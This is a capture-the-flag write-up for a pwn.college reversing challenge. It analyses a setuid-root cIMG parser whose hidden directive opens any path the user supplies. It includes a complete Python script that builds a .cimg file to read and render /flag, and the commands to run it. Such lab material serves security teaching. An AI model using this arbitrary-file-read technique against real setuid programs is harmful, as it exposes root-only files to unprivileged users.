---
layout: post
title: Accessing Resources
date: 2026-05-24 20:43 -0400
published: true
categories: ["Reversing Challenge","Pwn College"]
tags: ["CIMG Images", "Static analysis"]
toc: true
---
# Detailed Analysis: Pwn.College — Accessing Resources (cIMG)

## 1. Initial Reconnaissance

### 1.1. Challenge Goal
The `/challenge/cimg` binary is a parser for `.cimg` (Custom Image) format files. It is a **setuid root** binary, so it runs with elevated privileges. The goal is to obtain the flag located at `/flag`, which only the `root` user can read.

### 1.2. Environment Analysis
```bash
ls -la /challenge/cimg
# -rwsr-xr-x 1 root root 31KB ... /challenge/cimg

ls -la /flag
# -r-------- 1 root root 60 ... /flag
```

The binary is setuid root. Any vulnerability that allows accessing arbitrary files with the process's credentials will let us read `/flag`.

---

## 2. Static Analysis: Local vs Remote Binary

### 2.1. Download and Comparison
I downloaded the remote binary to compare it with the local version:

```bash
scp hacker@dojo.pwn.college:/challenge/cimg ./cimg_remote
```

**Critical difference discovered:**
- **Remote binary:** Implements handlers 1-5. There is a **hidden handler 5** that is undocumented.

### 2.2. Handler 5 Identification
Using string analysis and decompilation:

```bash
strings cimg_remote | grep -i "error\|invalid\|directive"
# ERROR: invalid directive_code %dx
```

In the `main` function (address `0x401284`), a directive counter is read from the header and iterated over. Each directive starts with a 2-byte code. The dispatch table checks:
- `directive_code == 1` → `handle_1`
- `directive_code == 2` → `handle_2`
- `directive_code == 3` → `handle_3`
- `directive_code == 4` → `handle_4`
- `directive_code == 5` → `handle_5`  

---

## 3. Reverse Engineering of `handle_5` (`0x401a3e`)

### 3.1. Decompilation and Pseudocode

```c
void handle_5(context_t *ctx) {
    char buf[258];
    read_exact(0, buf, 0x102);  // Reads exactly 258 bytes

    uint8_t  sprite_id = buf[0];
    uint16_t dims      = *(uint16_t*)(buf + 1);  // Bytes 1-2

    // CRITICAL! Swaps the dimension bytes
    // xchg dh, dl in assembly
    uint8_t width  = (dims >> 8) & 0xFF;   // Logical height → Stored width
    uint8_t height = dims & 0xFF;          // Logical width → Stored height

    char *path = buf + 3;  // Path starts at byte 3, null-terminated

    int fd = open(path, O_RDONLY);
    if (fd < 0) { exit(1); }

    uint8_t *sprite_data = malloc(width * height);
    read_exact(fd, sprite_data, width * height);

    // Validation: all bytes must be printable ASCII [0x20, 0x7E]
    for (int i = 0; i < width * height; i++) {
        if (sprite_data[i] < 0x20 || sprite_data[i] > 0x7E) {
            fprintf(stderr, "ERROR: Invalid character 0x%x in the image data!\n", sprite_data[i]);
            exit(1);
        }
    }

    ctx->sprites[sprite_id].data   = sprite_data;
    ctx->sprites[sprite_id].width  = width;
    ctx->sprites[sprite_id].height = height;
}
```

### 3.2. Vulnerability Analysis

**Vulnerability:** `handle_5` opens a file whose path is user-controlled (the `path` field in the payload). The binary runs as root (setuid), so it can open any file on the system, including `/flag`.

**Restrictions:**
1. Must read exactly `width * height` bytes from the file.
2. All bytes read must be in the range `[0x20, 0x7E]` (printable ASCII).
3. The path is a null-terminated string of up to 255 bytes.

**Implication for `/flag`:**
- The flag has the format `pwn.college{...}` which uses only printable ASCII characters.
- The `/flag` file ends with a newline `\n` (0x0a). This byte is **NOT** printable according to the validation (0x0a < 0x20).
- Therefore, we must read **all bytes except the last newline**.

### 3.3. The Dimension Byte-Swap

The code uses `xchg dh, dl` on the dimensions. This means:
- If we send `width=59, height=1` in the payload...
- The sprite is stored with `width=1, height=59`.
- But `read_exact` reads `width * height = 59 * 1 = 59` bytes.
- **It still works!** The product is commutative.

---

## 4. Reverse Engineering of `handle_4` — Rendering

### 4.1. Purpose
`handle_4` renders a previously loaded sprite to the output framebuffer (stdout). It uses ANSI escape codes for True Color.

### 4.2. Payload Format
```
opcode(2 bytes) + sprite_id(1) + r(1) + g(1) + b(1) + dest_x(1) + dest_y(1) + tile_w(1) + tile_h(1) + transparent(1)
Total: 11 bytes
```

### 4.3. Tiling Behavior
`handle_4` implements a "tiling" system where the sprite is repeated to fill a grid of `tile_w × tile_h` tiles. To avoid repetition and show the sprite exactly once:
- `tile_w = 1`
- `tile_h = 1`

This renders the sprite exactly once at position `(dest_x, dest_y)`.

---

## 5. Header Format Analysis

### 5.1. Header Structure (12 bytes)
```
Offset 0x00: "cIMG"              (4 bytes, magic)
Offset 0x04: version = 4         (2 bytes, uint16 little-endian)
Offset 0x06: framebuffer_width   (1 byte)
Offset 0x07: framebuffer_height  (1 byte)
Offset 0x08: num_directives      (2 bytes, uint16 little-endian)
Offset 0x0A: padding             (2 bytes, MUST BE 0x0000)
```

### 5.2. Critical Bug Found During Development
Initially, the generated header had only **10 bytes** (missing the 2 padding bytes). This caused the binary to misread the first `directive_code`, interpreting the sprite bytes as an opcode:

```
Without padding: [header 10B][opcode 5][sprite_id 0][width 59]...
The binary reads 12B for header → [header 10B][opcode 5][sprite_id 0]
Then reads 2B for directive_code → [width 59][height 1] = 0x013B = 315
Result: ERROR: invalid directive_code 315x
```

**Fix:** Add `b'\x00\x00'` at the end of the header to reach exactly 12 bytes.

---

## 6. Exploit Construction

### 6.1. Determining the Correct Flag Size

In challenge mode, `/flag` is 60 bytes:
```bash
ls -la /flag
# -r-------- 1 root root 60 ... /flag
```

This means: 59 flag characters + 1 newline (`\n`).

### 6.2. Exploit Parameters

| Parameter     | Value | Reason                                           |
| ------------- | ----- | ------------------------------------------------ |
| `sprite_w`    | 59    | Reads 59 bytes (entire flag without the newline) |
| `sprite_h`    | 1     | 1-line sprite                                    |
| `tile_w`      | 1     | No horizontal repetition                         |
| `tile_h`      | 1     | No vertical repetition                           |
| `dest_x`      | 0     | Top-left corner                                  |
| `dest_y`      | 0     | First row                                        |
| `transparent` | 0xFF  | No character is transparent                      |

### 6.3. Final `.cimg` File Structure

```python
import struct

# Header (12 bytes)
header = b'cIMG' + struct.pack('<H', 4) + struct.pack('<BB', 76, 24) + struct.pack('<H', 2) + b'\x00\x00'

# Directive 5: Load /flag as sprite 0 (258 bytes after opcode)
d5 = struct.pack('<H', 5)                      # opcode
d5 += struct.pack('<BBB', 0, 59, 1)            # sprite_id, width, height
d5 += b'/flag\x00'.ljust(255, b'\x00')        # path

# Directive 4: Render sprite 0 (9 bytes after opcode)
d4 = struct.pack('<H', 4)                      # opcode
d4 += struct.pack('<BBBBBBBBB', 0, 255, 255, 255, 0, 0, 1, 1, 0xFF)

exploit = header + d5 + d4  # Total: 283 bytes
```

---

## 7. Execution and Flag Capture

### 7.1. Execution Commands
```bash
# Generate exploit
python3 solve.py > /tmp/accessing_resources_exploit.cimg

# Upload to server
scp /tmp/accessing_resources_exploit.cimg hacker@dojo.pwn.college:/tmp/

# Execute and extract visible characters
/challenge/cimg /tmp/accessing_resources_exploit.cimg | sed 's/\x1b\[[0-9;]*m//g' | tr -d ' \n'
```


---

## 8. Complete Exploit Chain

```
User → Creates malicious .cimg
              ↓
      [Header: 2 directives]
              ↓
      [Directive 5: LOAD_SPRITE]
              ↓
      Reads 258 bytes from .cimg file
              ↓
      Extracts path = "/flag"
              ↓
      open("/flag", O_RDONLY)  ← As root! (setuid)
              ↓
      Reads 59 bytes from /flag
              ↓
      Validates: all are printable ASCII ✓
              ↓
      Stores sprite[0] = /flag data
              ↓
      [Directive 4: RENDER_SPRITE]
              ↓
      Renders sprite[0] to stdout framebuffer
              ↓
      Output: pwn.college{...}
```

---

## 9. Key Lessons

1. **Always compare local vs remote binaries:** Handler 5 did not exist in the local version. Without downloading the remote binary, it would never have been discovered.

2. **Pay attention to the exact header format:** The 2 extra padding bytes were the difference between an exploit that worked and one that failed with "invalid directive_code".

3. **Understand dimension semantics:** The `xchg dh, dl` swaps width/height, but since the product is commutative, it doesn't affect the number of bytes read.

4. **Work with validation constraints:** The newline byte `0x0a` at the end of `/flag` would have caused a failure. The solution was to read exactly `total_bytes - 1`.

5. **Setuid binary + controlled path = LFI (Local File Inclusion):** Handler 5 is essentially an arbitrary file read primitive as root.

---